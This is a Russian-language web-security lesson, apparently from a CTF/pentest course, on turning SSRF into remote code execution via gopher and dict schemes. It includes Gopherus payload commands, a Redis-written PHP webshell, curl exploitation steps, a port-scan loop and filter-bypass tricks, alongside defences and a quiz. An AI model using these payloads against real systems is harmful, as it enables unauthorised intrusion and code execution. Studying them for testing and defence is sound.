---
id: web-ssrf-protocol-smuggling
title: "SSRF-протокольная контрабанда: gopher, dict, redis, fastcgi, mysql"
category: web
parent: web-ssrf-advanced
difficulty: hard
order: 3
tags: [ssrf, gopher, redis, fastcgi, mysql, protocol]
prerequisites: [web-ssrf]
useful_for:
  - "CTF Web категория"
  - "Bug bounty"
  - "Пентест веб-приложений"
estimated_minutes: 45
summary: "Как превратить SSRF в RCE: gopher/dict-схемы, атака на Redis, FastCGI, MySQL и внутренние сервисы."
---
SSRF-протокольная контрабанда — это переход от «просто SSRF» к RCE. Обычный SSRF позволяет делать HTTP-запросы от имени сервера, но схемы **`gopher://`** и **`dict://`** позволяют отправить **произвольные байты в произвольный TCP-порт**. Это значит, что через SSRF можно «поговорить» с внутренним Redis, FastCGI, MySQL, Memcached — и получить запись файлов, выполнение кода или чтение данных. Именно поэтому `gopher` — самый опасный протокол в SSRF-контексте.

## Теория: почему gopher и dict так опасны

- **`gopher://host:port/_<payload>`** — устанавливает TCP-соединение и отправляет содержимое после `_` как есть (с URL-декодированием). Можно сформировать любой текстовый протокол вручную.
- **`dict://host:port/`** — словарный протокол; позволяет отправить одну строку, часто достаточно для простых команд Redis.
- **`file://`** — чтение локальных файлов.
- **`http://`** — только HTTP-семантика (метод/путь/заголовки), но не произвольные байты.

Ключ в том, что многие внутренние сервисы (Redis, FastCGI, MySQL) используют **простые текстовые/бинарные протоколы без аутентификации** и доверяют любому, кто может до них дотянуться. SSRF + gopher = «руки внутрь периметра».

## Инструменты: генерация payload и подтверждение

**Gopherus** — генерирует gopher-payload'ы под Redis, MySQL, FastCGI, Memcached, Zabbix и др.

```bash
# payload для записи webshell через Redis
python2 gopherus.py --exploit redis
#   даёт строку вида gopher://127.0.0.1:6379/_%2a1%0d%0a...
# payload для FastCGI -> PHP RCE
python2 gopherus.py --exploit fastcgi
# payload для MySQL (устаревший, но полезен)
python2 gopherus.py --exploit mysql
```

Для подтверждения SSRF без RCE используйте Collaborator/OOB-листенер:

```bash
# если приложение делает запрос к нашему листенеру -> SSRF есть
curl -s "https://app.example/fetch?url=http://UNIQUE.oob.example/"
```

## Разобранный пример: SSRF → Redis → webshell → RCE

Дано: параметр `url` уходит в `fetch()`; Redis на `127.0.0.1:6379` без пароля; webroot известен (`/var/www/html`).

```bash
# 1. генерируем payload, который через Redis запишет webshell
python2 gopherus.py --exploit redis
#   выбираем "PHPSESSID" / "custom" -> записать файл shell.php
#   вводим путь: /var/www/html/shell.php
#   вводим содержимое: <?php system($_GET['c']); ?>
# 2. получаем строку gopher://127.0.0.1:6379/_...
# 3. отправляем её в SSRF-параметр
curl -s "https://app.example/fetch?url=$(python2 -c 'import urllib;print(urllib.quote(open("gopher.txt").read()))')"
# 4. проверяем webshell
curl -s "https://app.example/shell.php?c=id"
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Как это работает: Redis получает последовательность команд `CONFIG SET dir /var/www/html` + `CONFIG SET dbfilename shell.php` + `SET x "<?php ...?>"` + `SAVE`. Redis пишет дамп БД в файл, который становится PHP-скриптом. **Точный путь webroot критичен** — без него файл запишется в директорию Redis.

## FastCGI и MySQL через gopher

**FastCGI** (порт 9000) — бинарный протокол, которым nginx общается с PHP-FPM. Через gopher можно сформировать FastCGI-запрос с `PHP_VALUE`/`PHP_ADMIN_VALUE`, задающими `auto_prepend_file=php://input` — и выполнить произвольный PHP.

```bash
python2 gopherus.py --exploit fastcgi
#   путь: /var/www/html/index.php
#   команда: id
# результат — gopher://127.0.0.1:9000/_%01%01...  (бинарь в hex)
```

**MySQL** (3306) — через gopher можно аутентифицироваться (если известны креды) и выполнять запросы; Gopherus умеет генерировать такой payload, но он хрупкий (зависит от версии и nonce).

## Разобранный пример: dict → Redis без gopher

Если `gopher` заблокирован, а Redis нужен, `dict` может хватить для простых команд:

```bash
# dict отправляет строку после слеша
curl -s "https://app.example/fetch?url=dict://127.0.0.1:6379/INFO"
# ответ с INFO Redis -> SSRF в Redis подтверждён
# запись через dict ограничена, но INFO/CONFIG читаются
```

`dict` обычно не даёт многострочных команд, поэтому для записи webshell всё же нужен gopher.

## Внутренние сервисы-цели (карта портов)

| Порт | Сервис | Что даёт через SSRF |
|------|--------|---------------------|
| 6379 | Redis | запись файла, RCE, чтение данных |
| 9000 | PHP-FPM (FastCGI) | RCE через PHP_VALUE |
| 3306 | MySQL | запросы при известных кредах |
| 11211 | Memcached | чтение/запись кеша, deser |
| 9200 | Elasticsearch | чтение индексов, RCE через скрипты |
| 2375 | Docker API | запуск контейнеров (RCE) |
| 8500 | Consul | секреты |
| 5984 | CouchDB | RCE через `_config` |
| 80/443 | внутренние веб-приложения | BOLA/обход периметра |

Первое, что делают при SSRF, — «прощупывают» эти порты через `http://127.0.0.1:PORT/` и смотрят на разницу ответов/времени.

## Обход фильтров схем

- **«URL должен начинаться с http»** → `http://127.0.0.1:6379/` (HTTP-обёртка), но для gopher нужны обходы: `http://expected.com@127.0.0.1/`, `http://127.0.0.1#@expected.com`.
- **Чёрный список схем** → регистр `Gopher://`, `gopher%3a//`, двойное кодирование.
- **`127.0.0.1` запрещён** → `2130706433` (decimal), `0x7f000001`, `0177.0.0.1`, `127.1`, `[::1]`, DNS-rebinding.
- **Белый список домена** → `expected.com.attacker.com`, `attacker.com#expected.com`, open redirect.
- **Проверка только по хосту** → редирект с разрешённого хоста на `gopher://`.

## Частые ошибки

- **Считать SSRF «низким риском».** С gopher/dict это RCE.
- **Не знать webroot.** Redis-запись без точного пути бесполезна.
- **Забыть URL-encode gopher-payload.** Gopherus уже кодирует — не портите.
- **Путать схемы.** `http://` не отправит произвольные байты, нужен `gopher`.
- **Игнорировать FastCGI.** PHP-FPM на 9000 — частый и мощный путь.
- **Ломать прод.** Запись файлов/перезапуск сервисов — только с согласия.

## Что дальше / решение

1. Подтвердите SSRF OOB-листенером.
2. Просканируйте внутренние порты (Redis/FastCGI/Docker/Elastic).
3. Для Redis/FastCGI сгенерируйте gopher-payload (Gopherus).
4. Узнайте webroot (LFI/ошибки/дефолты) и запишите webshell.
5. Подтвердите RCE read-back'ом (`id` через webshell).
6. Устойчивый канал (tunnel) + доказательство.
7. Тупик → смежные темы (`web-ssrf-cloud-deep`, `svc-database`).

## Справочная таблица

| Схема | Возможность | Пример |
|-------|-------------|--------|
| `gopher://` | произвольные байты TCP | Redis/FastCGI RCE |
| `dict://` | одна строка | Redis INFO |
| `file://` | чтение файла | `/etc/passwd` |
| `http://` | HTTP-запрос | внутренний API |
| decimal IP | обход фильтра | `2130706433` |
| `0x7f000001` | обход фильтра | hex IP |
## Практический чек-лист и разбор CTF-кейса

Типичный CTF-сценарий: есть эндпоинт `?url=`, который «делает превью» ссылки, и Redis на localhost. Задача — от SSRF дойти до RCE.

Пошагово:

1. **Подтвердите SSRF.** Подайте `url=http://UNIQUE.oob.example/` и убедитесь, что пришёл запрос к вашему листенеру. Это база — без подтверждения дальше нет смысла.
2. **Просканируйте порты.** Подайте `url=http://127.0.0.1:PORT/` для типовых портов (6379, 9000, 3306, 11211, 9200, 2375) и смотрите на разницу: `Connection refused` vs таймаут vs «странный» ответ. Быстрый способ — словарь портов через Burp Intruder.
3. **Определите сервис.** Для Redis `dict://127.0.0.1:6379/INFO` вернёт `# Server redis_version:...`. Для FastCGI — бинарный ответ или ошибку.
4. **Сгенерируйте payload.** Для Redis — `gopherus --exploit redis`; для FastCGI — `gopherus --exploit fastcgi`. Gopherus спросит путь и содержимое.
5. **Узнайте webroot.** Без точного пути Redis запишет дамп не туда. Источники: LFI, ошибки PHP (`Warning: include(...)`), дефолты (`/var/www/html`), конфиги.
6. **Запишите webshell.** Redis: `CONFIG SET dir <webroot>` + `CONFIG SET dbfilename shell.php` + `SET x "<?php ...?>"` + `SAVE`. FastCGI: `PHP_VALUE auto_prepend_file=php://input`.
7. **Подтвердите RCE.** Откройте `shell.php?c=id` и прочитайте вывод — это обязательный read-back, а не «payload отправлен».
8. **Закрепитесь.** Stateless RCE → reverse shell/tunnel, затем отметьте host как compromised.

Ключевой навык здесь — терпение при подборе webroot и порта. Большинство провалов — не «SSRF не работает», а «записали не в тот каталог».

## Почему gopher — «универсальный ключ»

Любой текстовый протокол можно «набрать руками» и отправить через gopher. Это значит, что одна SSRF-уязвимость даёт доступ ко **всем** внутренним сервисам с текстовым протоколом. Redis, Memcached, FastCGI, MySQL, Zabbix, SMTP — всё это цели для gopher. Поэтому при обнаружении SSRF приоритет №1 — перебрать внутренние порты и найти Redis/FastCGI: это самый быстрый путь к RCE.

## Защита и её обход

Правильно: белый список схем (`http`/`https` только), белый список хостов, блокировка внутренних диапазонов (`127.0.0.0/8`, `10/8`, `169.254/16`), запрет редиректов, отдельный сетевой сегмент для fetcher'а. Обходы: десятичный/hex IP, `[::1]`, DNS-rebinding, open redirect на разрешённом хосте, `@`-трюки, `#`-фрагменты. Каждая из этих техник обходит наивные фильтры, поэтому реальная защита — только сетевой сегмент + allowlist.
## Разобранный пример: SSRF-портскан через время отклика

Когда прямой ответ не отличается, порты можно «прощупать» по времени: открытый порт отвечает быстро, закрытый — либо мгновенный `refused`, либо таймаут. Через `http://127.0.0.1:PORT/` и замер `time_total` строится карта открытых портов.

```bash
for p in 6379 9000 3306 11211 9200 2375 8500 5984; do
  t=$(curl -s -o /dev/null -w '%{time_total}' "https://app.example/fetch?url=http://127.0.0.1:$p/")
  echo "$p -> $t"
done
```

В реальном тесте это делают через Burp Intruder (список портов) и сортируют по времени/коду. Так находят Redis и FastCGI, даже если фильтр запрещает «прямой» доступ к ним по имени.

## Другие сервисы через gopher

| Сервис | Протокол | Что даёт |
|--------|----------|----------|
| Memcached | текст | чтение/запись кеша → deser |
| Elasticsearch | HTTP | чтение индексов, RCE через скрипты |
| CouchDB | HTTP | RCE через `_config`/`_replicator` |
| Zabbix | текст | RCE через `system.run` |
| Docker API | HTTP | запуск контейнера → RCE хоста |
| Consul | HTTP | чтение секретов/KV |
| SMTP | текст | отправка писем (спам, фишинг) |

Memcached особенно интересен: если приложение кеширует сериализованные объекты, запись в Memcached через SSRF даёт десериализацию (см. `web-php-deser-chains`, `web-node-deser`). Docker API на 2375 без TLS — это прямой запуск привилегированного контейнера с монтированием хоста, то есть RCE уровня хоста.

## Итог

SSRF-протокольная контрабанда превращает «безобидное» чтение URL в RCE. Формула проста: **SSRF + внутренний сервис без аутентификации + текстовый протокол = gopher-атака**. Redis и FastCGI — самые частые и самые мощные цели; Memcached и Docker — следующие по приоритету. Начинайте с подтверждения SSRF, затем карта портов, затем gopherus под найденный сервис. И обязательно доводите до read-back артефакта: без вывода `id` RCE не считается подтверждённым.

## Квиз

```quiz
- question: "Какая схема позволяет отправить произвольные байты в TCP-порт?"
  options:
    - "http://"
    - "gopher://"
    - "file://"
    - "data://"
  answer: 1
  explanation: "Gopher шлёт сырые данные в сокет, что даёт доступ к Redis/FastCGI/MySQL."
- question: "Как из SSRF к Redis получить запись файла?"
  options:
    - "CONFIG SET dir + CONFIG SET dbfilename + SET + SAVE"
    - "FLUSHALL"
    - "INFO"
    - "MONITOR"
  answer: 0
  explanation: "Redis умеет писать RDB-файл в заданный каталог с заданным именем."
- question: "Какой внутренний сервис отвечает бинарным FastCGI и даёт RCE на PHP?"
  options:
    - "Memcached :11211"
    - "PHP-FPM :9000"
    - "Elasticsearch :9200"
    - "Docker :2375"
  answer: 1
  explanation: "PHP-FPM принимает FastCGI-записи, которые можно собрать через gopher."
- question: "Как обойти проверку 'url должен начинаться с http'?"
  options:
    - "Использовать gopher:// напрямую"
    - "Редирект с вашего сервера на gopher:// или смена регистра/кодирования схемы"
    - "Увеличить timeout"
    - "Добавить заголовок X-Forwarded-For"
  answer: 1
  explanation: "302-редирект или регистр/двойное кодирование часто обходят префиксные проверки."
- question: "Почему для Redis нужен точный путь каталога?"
  options:
    - "Redis кеширует путь"
    - "CONFIG SET dir и SAVE пишут файл именно в этот каталог, иначе SAVE вернёт ERR"
    - "Без пути Redis не запустится"
    - "Путь задаёт пароль"
  answer: 1
  explanation: "SAVE создаёт файл в dir с именем dbfilename; несуществующий путь даёт ошибку."
```

## Где пригодится

- **CTF (Web):** SSRF → gopher → Redis/FastCGI → RCE — классический финальный шаг многих веб-задач.
- **Bug bounty:** SSRF с поддержкой gopher к внутреннему Redis/Elasticsearch — critical (P1).
- **Пентест:** превращение периметровой SSRF в foothold во внутренней сети.
- **Работа (AppSec):** запрет не-HTTP схем в URL-фетчерах, изоляция исходящего трафика, auth в Redis/FastCGI.
